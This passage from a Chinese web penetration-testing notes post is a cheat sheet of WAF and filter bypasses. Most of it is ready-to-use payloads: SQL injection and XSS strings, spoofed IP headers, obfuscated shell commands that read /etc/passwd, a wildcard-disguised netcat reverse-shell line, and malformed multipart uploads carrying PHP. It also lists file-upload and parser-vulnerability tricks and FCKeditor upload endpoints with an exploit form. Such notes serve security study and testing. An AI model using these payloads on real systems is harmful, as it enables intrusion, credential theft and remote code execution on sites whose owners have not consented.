2）改变method为不规则，比如改get，post为HELLLOXX等（某些apache版本）<br>
<img src="https://img-blog.csdnimg.cn/20200920205445412.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<img src="https://img-blog.csdnimg.cn/20200920205510441.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<pre><code> GET/xxx/?id=1+and+sleep(3) HTTP/1.1
 DigApis /xxx/?id=1+and+sleep(3)HTTP/1.1
</code></pre>
<hr>
<p>**</p>
<h2><a id="Heard_IP__2274"></a>Heard IP 绕过</h2>
<p>（一般应用拦截，非WAF）</p>
<pre><code>X-forwarded-for：127.0.0.1 

X-remote-IP：127.0.0.1 

X-originating-IP：127.0.0.1 

x-remote-addr：127.0.0.1

x-client-1p：127.0.0.1
</code></pre>
<hr>
<p><strong>Heard content-type 绕过</strong></p>
<pre><code>content-type为空 

content-type改成其他的 

content-type必须指定唯一一个类型，例如 application/ octet- stream（比如安全狗）

content-type改成不规则的text/htm1xxxxxx

Content-Type：multipart/form-data ; boundary=0000 

Content-Type：mUltiPart/ForM-dATa；boundary=0000 

Content-Type：multipart/form-datax；boundary=0000 

Content-Type：multipart/form-data，boundary=0000 

Content-Type：multipart/form-data boundary=0000 

content-Type：multipart/whatever；boundary=0000

content-Type：multipart/； boundary=0000

content-Type: application/octet-stream；
</code></pre>
<hr>
<h2><a id="XSS_2319"></a>XSS</h2>
<p>基础常用的常规语句</p>
<pre><code>?id=alert(document['cookie']) 

?id=";location=location.hash)//#0={};alert(0) 

?id=%";eval(unescape(location))//#%0Aalert(0) 

?id=&lt;script&lt;{alert(1)}/&gt;&lt;/script&gt; 

?id=&lt;img src=x:alert(alt) onerror=eval(src) alt=0&gt;

?id=%3cscript%3ealert(1)%3c%2fscript%3c 

?id=&lt;a href="javas&amp;#99;ript&amp;#35;alert(1);"&gt;

id=%253c%2573%2563%2572%2569%2570%2574%253e%2561%256c%2565%2572%2574%2528%2531%2529%253c%252f%2573%2563%2572%2569%2570%2574%253e

?id=&lt;object+data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="&gt;&lt;/object&gt;

?id=1234&amp;"&gt;&lt;script&gt;alert(1)&lt;/script&gt;=1234     #参数名
</code></pre>
<p>直接在文件名例如asp、php后加即可绕过<br>
参考文章：</p>
<pre><code>https://www.cnblogs.com/lcamry/articles/5622244.html
</code></pre>
<hr>
<h2><a id="SQL_2351"></a>SQL</h2>
<p>简单判别诸如点以及数据库类型 ：</p>
<pre><code>I 数据库类型丨连接符丨注释符号丨其他特殊方式丨唯一的默认表变量和函数 

I MSSQL| %2B (URL加号编码) | -- | 待补充丨@@PACK_RECEIVED 

I MYSQL| %20 (URL空格编码)丨# / -- | 待补充 |  CONNECTION_ID() 

I Oracle I %7C (URL竖线编码) | -- 待补充 | BITAND(1,1) 

I PGsql | %7C (URL竖线编码) | -- |ad1::int=1 | getpgusername() 

| Access | %26 (URL与号编码) | N/A | 待补充 | msysobjects
</code></pre>
<p>为避免被wa拦截以及封禁P,注入建议不首先使用and以及o语句。</p>
<p>可用如下方式替换：</p>
<p>数字型注入：</p>
<pre><code>?id=2*2

?id=4
</code></pre>
<p>字符型注入，根据上表判断】</p>
<pre><code>?key=wo'+'rd

?key=wo'||'rd

?key=wo' 'rd
</code></pre>
<hr>
<h2><a id="Mysql_2392"></a>Mysql</h2>
<pre><code>?id=ord('a')=97 

?id=123+AND+1=1 

?id=123+&amp;&amp;+1=1 

?id='=’

?id=123+AND+md5(‘a’)!= md5(‘A’) 

?id=123+and+len(@@version)&gt;1 

?id=1’||1=’1 

?id=123‘+like+'123 

?id=123'+not+like+'1234 

?id='aaa'&lt;&gt;'bbb'

?id=123/*! union all select version() */-- 

?id=123/*!or*/1=1; 

?id=(1)union(((((((select(1), hex(hash)from(users))))))))       ---7个+8个括号 

?id=1+union+(select’1‘,concat(login,hash)from+users) 

?id=1+%55nion(%53elect 1, 2, 3)-- -

?id=1/*!000000union*/select%0d%0a/*asdas/asd asasd*/version() 

?id=1 union(select%0aall{x users}from{x ddd})
</code></pre>
<hr>
<p><strong>Mysql常用函数</strong><br>
字符串处理：</p>
<pre><code>?key=user' OR mid(password,1,1)='*'

?key=user' OR mid(password,1,1)=0x2a

?key=user' OR mid(password,1,1)=unhex('2a') 

?key=user' OR mid(password,1,1) regexp '[*]'

?key=user' OR mid(password,1,1) like '*' 

?key=user' OR mid(password,1,1) rlike '[*]'

?key=user' OR ord(mid(password,1,1))=42 

?key=user' OR ascii(mid(password,1,1))=42 

?key=user' OR find_in_set('2a',hex(mid(password,1,1)))=1

?key=user' OR position(0x2a in password)=1

?key=user' OR locate(ox2a,password)=1
</code></pre>
<pre><code>?key=user' OR substring((select 'password'),1,1) = 0x70 

?key=user' OR substr((select 'password'),1,1) = 0x70 

?key=user' OR mid((select 'password'),1,1) = 0x70 

?key=user' OR strcmp(left('password',1), 0X69) = 1 

?key=user' OR strcmp(left('password',1), 0×70) = 0

?key=user' OR strcmp(left('password',1), 0x71) = -1
</code></pre>
<hr>
<h2><a id="_2472"></a>命令执行</h2>
<p><strong>‘  （单引号）以及 \  （反斜杠）绕过</strong></p>
<pre><code>$ echo orleven 
orleven

$ echo o'r'l'e'v'e'n''
oreven 

$ /b'i'n/c'a't/e't'c/p'a's's'w'd' 
root: x: 0: 0: root: /root:/bin/bash 
daemon: x: 1: 1: daemon: /usr/sbin: /usr/sbin/nologin 
bin: x: 2: 2: bin:/bin: /usr/sbin/nologin 

$ /b\i\n/c\at /et'c'/pa's'swd 
root: x: 0: 0: root: /root: /bin/bash 
daemon: x: 1: 1: daemon: /usr/sbin: /usr/sbin/nologin 
bin: x: 2: 2: bin:/bin: /usr/sbin/nologin
</code></pre>
<hr>
<p><strong>? 、 * 、 [、 ]、 ^、 -  通配符绕过</strong><br>
问号最好只匹配到唯一一条</p>
<pre><code>$ /b??/c?t /etc/??ss?d

root: X: 0: 0: root: /root: /bin/bash 
daemon: x: 1: 1: daemon: /usr/sbin: /usr/sbin/nologin 
bin: X: 2: 2: bin:/bin: /usr/sbin/nologin 

$ /???/n? -e /???/b??h 2130706433 1337 # /bin/nc -e /bin/bash 127.0.0.1 1337
</code></pre>
<hr>
<p><strong>$ 不存在的符号</strong></p>
<pre><code>cat $u/etc$u/passwd$u 

root: x: 0: 0: root: /root: /bin/bash 
daemon: x: 1: 1: daemon: /usr/sbin: /usr/sbin/nologin 
bin: x: 2: 2: bin: /bin: /usr/sbin/nologin 
</code></pre>
<p><strong>;	分号执行</strong></p>
<pre><code>$ cat /etc/passwd;ls 

.......

mysql:x:110:115:MySQL Serve,,,:/nonexistent:/bin/false 

a.out go gobuster gopath soft sqlmap.log tool
</code></pre>
<hr>
<h2><a id="_2530"></a>文件上传绕过</h2>
<p><strong>文件名绕过</strong></p>
<pre><code>1）文件名加回车
2）shell.php(%80-%99).jpg 绕过
3）如果有改名功能，可先上传正常文件，再改名 
4）%00
5）00(hex)
6）长文件名（windows 258byte | linux 4096byte ），可使用非字母数字，比如中文等最大程
度的拉长。 
7）重命名
</code></pre>
<p><strong>脚本后缀</strong></p>
<pre><code>Php/php3/php/php5/php6/pht/phpt/phtml 

asp/cer/asa/cdx/aspx/ashx/ascx/asax 

jsp/jspx/ispf
</code></pre>
<hr>
<h2><a id="_2554"></a>解析漏洞</h2>
<p>服务器特性:<br>
1.会将Request中的不能编码部分的%去掉<br>
2.Request中如果有unicode部分会将其进行解码</p>
<p><strong>IIS</strong></p>
<p>lIS6.0两个解析缺陷：目录名包含asp、.asa、.cer的话，则该目录下的所有文件都将按照asp解析</p>
<p>例如:</p>
<p>/abc,asp/1.jpg 会当做 /abc,asp 进行解析<br>
/abc.php/1.jpg 会当做 /abc.php 进行解析</p>
<p><strong>Apache1.X.2.X解析漏洞</strong></p>
<p>Apache在以上版本中，解析文件名的方式是从后向前识别扩展名，直到遇见Apache可识别的扩展名为止</p>
<p><strong>Nginx</strong></p>
<p>以下Nginx容器的版本下，上传一个在waf白名单之内扩展名的文件shell. jpg，然后以shell.j pg.php进行请求</p>
<pre><code>• Nginx 0.5.*
• Nginx 0.6.*
• Nginx 0.7 &lt;= 0.7.65
• Nginx 0.8 &lt;= 0.8.37
</code></pre>
<p>以上Nginx容器器的版本下，上传⼀个在waf白名单之内扩展名的文件shell.jpg，然后以shell.jpg%20.php进行请求</p>
<pre><code>• Nginx 0.8.41 – 1.5.6：
</code></pre>
<p>以上Nginx容器的版本下，上传一个在waf白名单之内扩展名的文件shell.jpg，然后以shell.jpg%20.php进行请求</p>
<hr>
<h2><a id="PHP_CGI__2591"></a>PHP CGI 解析漏洞</h2>
<pre><code>IIS 7.0/7.5
Nginx &lt; 0.8.3
</code></pre>
<p>以上的容器版本中默认php配置文件cgi.fix_pathinfo=1时，上传一个存在于白名单的扩展名文件shell.jpg，在请求时以shell.jpg/shell.php请求，会将shell.jpg以php来解析</p>
<pre><code>https://xz.aliyun.com/t/337
</code></pre>
<hr>
<h2><a id="NTFS_ADS_2604"></a>系统特性：利用NTFS ADS特性</h2>
<p>ADS是NTFS磁盘格式的一个特性，用于NTFS交换数据流。在上传文件时，如果waf对请求正文的filename匹配不当的话可能会导致绕过</p>
<pre><code>test.asp.
test.asp(空格)
test.php:1.jpg
test.php: $DATA
test.php_
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20200921213335297.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
参考文章：</p>
<pre><code>https://xz.aliyun.com/t/1189
</code></pre>
<hr>
<h2><a id="waf_2621"></a>协议解析不一致，绕过waf（注入跨站也可尝试）</h2>
<p>因为这种不仅仅存在于上传之处，注入跨站也可尝试</p>
<p><strong>垃圾数据</strong></p>
<pre><code>-------------WebkitFormBoundaryFADasdasdasDdasd

Content-Disposition: form-data; name="file", filename=abc.php’;aaaaaaaaaaaaaaaa 

Content-Type: application/octet-stream；


&lt;?php phpinfo(); ?&gt;
-------------WebkitFormBoundaryFADasdasdasDdasd
</code></pre>
<hr>
<h2><a id="Header__2639"></a>文件类型绕过/Header 头类型</h2>
<p>修改文件类型绕过/Header头的Content-Type，多次尝试:</p>
<pre><code>Content-Type：application/x-www-form-urlencoded；

Content-Type：multipart/form-data； 

Content-Type：application/octet-stream；
</code></pre>
<h2><a id="_2650"></a>未解析所有文件</h2>
<p>multipart协议中，一个POST请求可以同时上传多个文件。如图，许多WAF只检查第一个上传文件，没有检查上传的所有文件，而实际后端容器会解析所有上传的文件名，攻击者只需把paylaod放在后面的文件PART，即可绕过<br>
<img src="https://img-blog.csdnimg.cn/20200921215009791.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<pre><code>https://blog.csdn.net/qq_32393893/article/details/81625047
</code></pre>
<hr>
<h2><a id="ContentDisposition_2659"></a>不规则Content-Disposition文件名覆盖</h2>
<pre><code>-------------WebkitFormBoundaryFADasdasdasDdasd

content-Dispositiona：form-data; name="file"; filename='abc.jpg' 

Content-Disposition：form-data; name="file"; filename=abc.php'

Content-Type: application/octet-stream; 


&lt;?php phpinfo(); ?&gt;
-------------WebkitFormBoundaryFADasdasdasDdasd
</code></pre>
<hr>
<p><img src="https://img-blog.csdnimg.cn/20200921220157809.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<pre><code>https://weibo.com/ttarticle/p/show?id=2309404007261092631700
</code></pre>
<p>文章讲解了Content-Disposition各种不规则绕过方法</p>
<hr>
<h2><a id="boundary__2684"></a>boundary 绕过</h2>
<p>boundary边界不一致(Win2k3 + llS6.0 + ASP)</p>
<pre><code>1）%u特性: iis支持对unicode的解析，如:payload为[s%u006c%u0006ect],解析出来后则是[select]
     %u0061nd 1=1
    另类%u特性: unicode在iis解析之后会被转换成multibyte，但是转换的过程中可能出现:多个widechar可能会转换为同一个字符。
    如：select中的e对应的unicode为%u0065，但是%u00f0同样会被转换成为e s%u00f0lect
    iis+asp
    
2）%特性: union selec%t user fr%om dd #iis+asp asp+iis环境下会忽略掉百分号，如：payload为[sele%ct], 解析出来后则是[select]
    
3）asp/asp.net在解析请求的时候，允许Content-Type: application/x-www-form-urlencoded的数据提交方式select%201%20from%20user
    
    asp/asp.net request解析:
4）在asp和asp.net中获取用户的提交的参数一般使用request包，当使用request(‘id’)的形式获取包的时候，会出现GET，POST分不清的情况，譬如可以构造一个请求包，METHOD为GET，但是包中还带有POST的内容和POST的content-type, 换一种理解方式也就是将原本的post数据包的method改成GET,如果使用request(‘id’)方式获取数据，仍会获取到post的内容
</code></pre>
<p><strong>php+apache畸形的boundary：</strong><br>
php在解析multipart data的时候有自己的特性，对于boundary的识别，只取了逗号前面的内容，例如我们设置的boundary为—-aaaa,123456，php解析的时候只识别了—-aaaa,后面的内容均没有识别。然而其他的如WAF在做解析的时候，有可能获取的是整个字符串，此时可能就会出现BYPASS</p>
<pre><code>Content-Type: multipart/form-data; boundary=------,xxxx
    Content-Length: 191

    ------,xxxx
    Content-Disposition: form-data; name="img"; filename="img.gif"

    GIF89a
    ------
    Content-Disposition: form-data; name="id"

    1' union select null,null,flag,null from flag limit 1 offset 1-- -
    --------
    ------,xxxx--
</code></pre>
<p><strong>畸形method(header头中)</strong></p>
<p>某些apache版本在做GET请求的时候，无论method为何值均会取出GET的内容。如请求的method名为DOTA，依然会返回GET方法的值，即,可以任意替换GET方法为其它值，但仍能有效工作，但如果waf严格按照GET方法取值，则取不到任何内容</p>
<p>参考文章：</p>
<pre><code>https://xz.aliyun.com/t/2418
</code></pre>
<hr>
<h2><a id="_2731"></a>文件名覆盖绕过</h2>
<p><img src="https://img-blog.csdnimg.cn/20200921221436195.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
参考文章：</p>
<pre><code>https://xz.aliyun.com/t/15
</code></pre>
<hr>
<p><strong>文件名回车</strong></p>
<pre><code>Content-Disposition: form-data; name=img"; filename="img.ph
p"
</code></pre>
<hr>
<h2><a id="_2746"></a>遗漏文件名</h2>
<p>当AF遇到"name=" myfile";"时,认为没有解析到 filename。而后端容器继续解析到的文件名是t3jsp,导致WAF被绕过</p>
<pre><code>content-Disposition: form-data; name="myfile";; filename="t3. jsp"
</code></pre>
<hr>
<h2><a id="_2754"></a>其他类型绕过</h2>
<p>以下均某一漏洞类型为例，具体皆可应用于XSS、SQL注入、命令执行等漏洞</p>
<p><strong>参数绕过</strong></p>
<p>PHP</p>
<pre><code>?%20value=payload 
</code></pre>
<p>ASP</p>
<pre><code>?%value=payload 

?%}9value=payload
</code></pre>
<p><strong>参数溢出</strong></p>
<pre><code>?id=111111111111111111111  （长很长)	and 1=1 

?id=1111111111  union   %23xxxxxxxxxxxxx	(很长很长)	xxxx%0d select	等 
</code></pre>
<p>参数截断</p>
<pre><code>http://example.com/file%00.txt
</code></pre>
<hr>
<h2><a id="HPP_HTTP_2788"></a>HPP HTTP参数污染/拼接绕过</h2>
<p>(以Mysql为例)</p>
<pre><code>?id=123+union+select+1,2,3+from+table

?id=123+union+select+1&amp;id=2,3+from+table

?id=123+union+select/*&amp;id=*/user&amp;id=pass/*&amp;id=*/from/*&amp;id=*/users id=select/*,*/.............
</code></pre>
<p>这是中间件与参数拼接的关系图<br>
<img src="https://img-blog.csdnimg.cn/20200921222946719.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<hr>
<h2><a id="HPF_HTTP_2803"></a>HPF HTTP分割注绕过</h2>
<p>这种方法是HTTP分割注入，同CRLF有相似之处(使用控制字符%0a、%0d等执行换行)<br>
举例：</p>
<pre><code>/?a=1+union/&amp;b=/select+1,pass/&amp;c=/from+users–
　　select * from table where a=1 union/* and b=/select 1,pass/ limit */from users—
</code></pre>
<p>看罢上面两个示例，发现和HPP最后一个示例很像，不同之处在于参数不一样，这里是在不同的参数之间进行分割，到了数据库执行查询时再合并语句</p>
<p>参考文章：</p>
<pre><code>https://zhuanlan.zhihu.com/p/79356937
</code></pre>
<hr>
<h2><a id="_2822"></a>最后另类绕过合集</h2>
<p><strong>路径系列：</strong></p>
<pre><code>?path=/path/////////././././////////blah/blah/blah/../../../vuln.php

/path: /vuln. php?value=PAYLOAD
/path/;lol=lol/vuln. php?value=PAYLOAD
/path/vuln.php/lolol?value=PAYLOAD
/path/vuln.php;lol=lol?value=PAYLOAD
</code></pre>
<p><strong>编码绕过</strong></p>
<pre><code>URL Encode - %27 

Double URL Encode - %2527 

UTF-8 (2 byte) - %c0%a7 

UTF-8 (JAVA) - \ uc0a7 

HTML Entity - &amp;apos；

HTML Entity Number - &amp;#27； 

Decimal - $#39

Unicode URL Encoding - %u0027 

Base64 - Jw==
</code></pre>
<p><strong>iis+asp(x)</strong></p>
<p><strong>%u 特性：</strong></p>
<p>iis支持对unicode的解析，如：payload为 s%u006c%u0006ect，解析出来后则是	select</p>
<p>另类%u特性: unicode在iis解析之后会被转换成multibyte，但是转换的过程中可能出现：多个widechar可能会转换为同一个字符</p>
<p>如: selec中的e对应的unicode为%u0065，但是%u00f0同样会被转换成为e</p>
<pre><code>s%u0065lect-&gt;select s%u00f0lect-&gt;select
</code></pre>
<p>WAF层可能能识别s%u0065lect的形式，但是很有可能识别不了s%u00f0lect的形式。这样就可以利用起来做WAF的绕过</p>
<p>常见三个关键字（union+select+from）的测试情况：</p>
<pre><code>s%u0045lect = s%u0065lect = %u00f0lect
u --&gt; %u0055 --&gt; %u0075
n --&gt;%u004e --&gt; %u006e
i --&gt;%u0049 --&gt; %u0069
o --&gt;%u004f --&gt; %u006f --&gt;%u00ba
s --&gt;%u0053 --&gt; %u0073
l --&gt;%u004c --&gt; %u006c
e --&gt;%u0045 --&gt; %u0065--&gt;%u00f0
c --&gt;%u0043 --&gt; %u0063
t --&gt;%u0054 --&gt;%u0074 --&gt;%u00de --&gt;%u00fe
f --&gt;%u0046 --&gt;%u0066
r --&gt;%u0052 --&gt;%u0072
m --&gt;%u004d --&gt;%u006d
</code></pre>
<p><strong>asp/asp.net解析请求</strong></p>
<p>asp/asp.net在解析请求的时候，允许Content-Type: application/x-www-form-urlencoded的数据提交方式select%201%20rom%20user</p>
<hr>
<p><strong>大小写变化(非WAF，仅过滤绕过)</strong></p>
<pre><code>?id=&lt;sCripT&gt;AleRt(123)&lt;/scRIpt&gt; 

?id=123 uni0n SeLEcT BaNneR FroM v$vERsIon whERe ROwNUm=1 
</code></pre>
<hr>
<p><strong>加粗样式</strong>嵌套（非WAF，仅过滤绕过）</p>
<p>另类</p>
<pre><code>?id=1+un/**/ion+sel/**/ect+1,2,3-- 
</code></pre>
<p><strong>针对中间分析设备</strong></p>
<pre><code>Get /test HTTP/1.1 &gt; GET test,randkey.yourloggingdomain.com 

Get /test HTTP/1.1 &gt; GET http://test.randkey.yourloggingdomain.com 

Get /test HTTP/1.1 &gt; GET @test.randkey.yourloggingdomain.com 
</code></pre>
<p>分析设备拼接后:</p>
<pre><code>host.test.randkey.yourloggingdomain.com
</code></pre>
<p>参考文章：</p>
<pre><code>https://www.owasp.org/index.php/SQL_Injection_Bypassing_WAF
https://mp.weixin.qq.com/s/e1jy-DFOSROmSvvzX_Ge5g
</code></pre>
<hr>
<h2><a id="225_JS_2932"></a>2.2.5 登录口JS前端加密绕过</h2>
<p><strong>概述</strong></p>
<p>渗透测试过程中遇到web登录的时候，现在很多场景账号密码都是经过js加密之后再请求发送（通过抓包可以看到加密信息）如图一burp抓到的包,request的post的登录包，很明显可以看到password参数的值是经过前端加密之后再进行传输的，遇到这种情况,普通发包的爆破脚本就很难爆破成功。鉴于这种情况,这边分析四种方式进行绕过加密爆破</p>
<p><img src="https://img-blog.csdnimg.cn/20200921230809670.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
参考文章：大概能分为以下四种方法</p>
<pre><code>https://www.freebuf.com/articles/web/127888.html
</code></pre>
<p>我将几种方法口语化简述下:</p>
<p>1）既然是前端s加密，代码我们都能看得到，我们搭个服务器，每次发包前，把要发送的加密参数用服务器加密一遍，我们再把加密后的参数发送过去，这样相当于本地还原了加密过程</p>
<p>2）利用selenium webdriver等完全模拟人工输入，字典也可以自定义，不过需要自己写脚本而已,这种方法比较万能</p>
<p>3）这种方法适合有js功底的同学，首先把他的js加密过程跟方法看懂，然后本地简化或者用其他语言模拟他的加密过程，再自己写脚本去跑，或者生成加密后的字典直接burp去跑即可</p>
<p>4）前人栽树，后人乘凉，cony1老哥为了方便后辈，写了一款burp插件， <code>https://github.com/c0ny1/jsENcrypter</code>，名为jsEncrypter，简单来说就是把1，3点结合了一下，用插件方便地跑起来</p>
<h2><a id="jsEncrypter_dayuSixth_day_2954"></a>jsEncrypter安装与本地测试 （dayu-Sixth day）</h2>
<p>这里重点介绍第四种方法</p>
<p>1）首先得安装 maven，mac下直接 brew install maven<br>
安装连接：<br>
https://www.runoob.com/maven/maven-setup.html<br>
<img src="https://img-blog.csdnimg.cn/20200922202706182.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
按照文档三种系统都有安装方法</p>
<p>1）安装好maven后，把jsEncrypter git clone回来或者下载回来解压缩，然后在他的文件夹下，打开cmd窗口，然后运行mvn package，就可以把插件编译成型，编译好后会多出一个target文件夹<br>
<img src="https://img-blog.csdnimg.cn/20200922203112266.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
命令：<code>mvn package</code></p>
<p>这里不演示下去了…详细的查看文章…</p>
<pre><code>https://fucker-shamo.github.io/2019/08/04/登陆口js前端加密绕过/
</code></pre>
<p>中间复现会遇到的一些问题：<br>
安装phantomJS环境变量参考：https://blog.csdn.net/xc_zhou/article/details/80700640</p>
<p>参考链接：</p>
<pre><code>http://gv7.me/articles/2018/fast-locate-the-front-end-encryption-method/
https://www.freebuf.com/articles/web/184455.html
https://bbs.ichunqiu.com/thread-42457-1-3.html
http://gv7.me/articles/2017/jsEncrypter/
https://www.freebuf.com/articles/web/127888.html
https://www.cnblogs.com/xiaozi/p/9158988.html
</code></pre>
<hr>
<h2><a id="226_XMLDecoder_POC_2988"></a>2.2.6 XMLDecoder 标签、POC</h2>
<p>详细介绍以下内容：<br>
标签类型：<br>
1）java<br>
2）array<br>
3）class<br>
4）object<br>
5）void<br>
6）new<br>
7）field<br>
8）method<br>
9）property<br>
10）byte<br>
11）其余数据类型</p>
<p>XML的基本语法<br>
XML简单利用</p>
<p>详细文章：</p>
<pre><code>https://xz.aliyun.com/t/7944
</code></pre>
<p>该文章全面的介绍了XMLDecoder遇到的基础知识…了解后我们开始看下面的CVE解析文章</p>
<pre><code>http://xxlegend.com/tags/XMLDecoder/    --CVE-2019-2725、Weblogic XMLDecoder RCE分析
https://payloads.info/2020/07/01/Java安全-反序列化篇-XMLDecoder到Weblogic几个补丁的绕过分析/  
文章非常详细的POC
</code></pre>
<hr>
<h2><a id="227_phpMyAdmingetshell_3018"></a>2.2.7 phpMyAdmin去getshell</h2>
<p><strong>前言</strong></p>
<p>在学习sql语句之前，拿到phpmyadmin弱口令登录到后台却不知道怎么利用，学习之后却有了新的想法利用phpMyadmin getshello接下去来验证自己的猜想</p>
<p><strong>phpMyAdmin的简介</strong><br>
phpMyAdmin 是一个以PHP为基础，以Web-Base方式架构在网站主机上的MySQL的数据库管理工具，让管理者可用Web接口管理MySQL数据库。借由此Web接口可以成为一个简易方式输入繁杂SQL语法的较佳途径，尤其要处理大量资料的汇入及汇出更为方便。其中一个更大的优势在于由于phpMyAdmin跟其他PHP程式一样在网页服务器上执行，但是您可以在任何地方使用这些程式产生的HTML页面，也就是于远端管理MySQL数据库，方便的建立、修改、删除数据库及资料表。也可借由phpMyAdmin建立常用的php语法，方便编写网页时所需要的sql语法正确性。</p>
<p>详细文章：</p>
<pre><code>https://xz.aliyun.com/t/3283
https://my.oschina.net/u/4196756/blog/4408564   --近期最新文章复现讲解
https://zhuanlan.zhihu.com/p/25957366
</code></pre>
<hr>
<h2><a id="228_JWT_3036"></a>2.2.8 攻击JWT的一些方法</h2>
<p><img src="https://img-blog.csdnimg.cn/20200922213304569.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
详细文章：</p>
<pre><code>https://xz.aliyun.com/t/6776
</code></pre>
<p>该文章中REF有详细链接，以及针对JWT的爆破密匙工具c-jwt-cracker也有详细链接介绍等</p>
<hr>
<h2><a id="229__3046"></a>2.2.9 上传漏洞</h2>
<p><img src="https://img-blog.csdnimg.cn/20200922220532375.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<h2><a id="_3049"></a>上传技巧</h2>
<pre><code>大小写混淆

%00截断 

上传.htaccess分布式部署文件 

图片文件头：47 49 46 38 39 61 (gif)、FF D8 FF E0 00 10 4A 46 49 46 (jpg) 、89 50 4E 47 (png) 

其他解析格式：cer、asa、php4、php3、php5、phtml、jspx

修改（Content-type）MIME 

目录回溯符 filename="../backdoor. php"
</code></pre>
<hr>
<p><strong>编辑器漏洞</strong></p>
<p>百度编辑器 Ueditor</p>
<pre><code>controller.ashx?action=catchimage
</code></pre>
<p><strong>FCKeditor</strong></p>
<p>查看版本</p>
<pre><code>/fckeditor/editor/dialog/fck_about.html
/fckeditor/_Whatsnew.html
</code></pre>
<p><strong>上传页面</strong><br>
常用的上传地址：</p>
<pre><code>FCKeditor/editor/filemanager/browser/default/connectors/asp/connector.asp?Command=GetFoldersAndFiles&amp;Type=Image&amp;CurrentFolder=/

FCKeditor/editor/filemanager/browser/default/browser.html?type=Image&amp;connector=connectors/asp/connector.asp

FCKeditor/editor/filemanager/browser/default/browser.html?Type=Image&amp;Connector=http://www.site.com%2Ffckeditor%2Feditor%2Ffilemanager%2Fconnectors%2Fphp%2Fconnector.php (ver:2.6.3 测试通过)
</code></pre>
<pre><code>JSP 版：

FCKeditor/editor/filemanager/browser/default/browser.html?Type=Image&amp;Connector=connectors/jsp/connector.jsp

注意红色部分修改为FCKeditor 实际使用的脚本语言，蓝色部分可以自定义文

件夹名称也可以利用../..目录遍历，紫色部分为实际网站地址。
</code></pre>
<pre><code>FCKeditor 中test 文件的上传地址

FCKeditor/editor/filemanager/browser/default/connectors/test.html

FCKeditor/editor/filemanager/upload/test.html

FCKeditor/editor/filemanager/connectors/test.html

FCKeditor/editor/filemanager/connectors/uploadtest.html
</code></pre>
<pre><code>一般很多站点都已删除_samples 目录，可以试试。

FCKeditor/editor/fckeditor.html 不可以上传文件，可以点击上传图片按钮再选择浏览服务器即可跳转至可上传文件页。
</code></pre>
<p>参考文章：</p>
<pre><code>https://cloud.tencent.com/developer/news/210677
</code></pre>
<hr>
<h2><a id="_3128"></a>上传的思路</h2>
<p><strong>Version 2.2 版本</strong></p>
<p>Apache+linux 环境下在上传文件后面加个.突破！测试通过</p>
<p><strong>Version &lt;=2.4.2 For php</strong></p>
<p>在处理PHP 上传的地方并未对Media 类型进行上传文件类型的控制，导致用户上传任意文件！将以下保存为html文件，修改action地址</p>
<pre><code>&lt;form id="frmUpload" enctype="multipart/form-data"
action="http://www.site.com/FCKeditor/editor/filemanager/upload/php/upload.php?Type=Media" 

method="post"&gt;Upload a new file:&lt;br&gt;
&lt;input type="file" name="NewFile" size="50"&gt;&lt;br&gt;
&lt;input id="btnUpload" type="submit" value="Upload"&gt;
&lt;/form&gt;
</code></pre>
<p><strong>FCKeditor 文件上传.变_下划线的绕过方法</strong></p>
<p>很多时候上传的文件例如：shell.php.rar 或shell.php;.jpg 会变为shell_php;.jpg 这是新版FCK 的变化</p>
